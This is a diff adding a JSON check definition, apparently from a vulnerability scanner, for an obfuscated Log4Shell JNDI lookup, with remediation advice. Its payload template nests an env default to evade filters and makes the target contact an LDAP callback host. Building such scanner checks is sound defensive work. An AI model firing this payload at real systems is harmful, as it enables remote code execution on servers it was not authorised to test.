@@ -1,0 +1,21 @@
+{
+  "id": "m3-blind-jndi-obf-sysprop",
+  "bug_class": "deserialization",
+  "title": "JNDI/Log4Shell lookup (obfuscated ${env:...:-l} default nesting)",
+  "severity": "Critical",
+  "applies_when": {
+    "always": true
+  },
+  "insertion_kinds": [],
+  "oracle": {
+    "kind": "oob",
+    "payload_template": "${{jndi:${{env:NOPE:-l}}dap://{callback}/a}}"
+  },
+  "references": [
+    "CWE-917",
+    "CWE-502",
+    "CAPEC-586"
+  ],
+  "remediation": "Do not evaluate untrusted input as a lookup/expression. Patch Log4j/limit JNDI lookups (log4j2.formatMsgNoLookups / remove JndiLookup), disable remote codebase loading (com.sun.jndi.*.object.trustURLCodebase=false), and treat message/EL interpolation of user data as unsafe. The inbound callback proves the lookup fired.",
+  "payload_family": "jndi-obfuscated"
+}
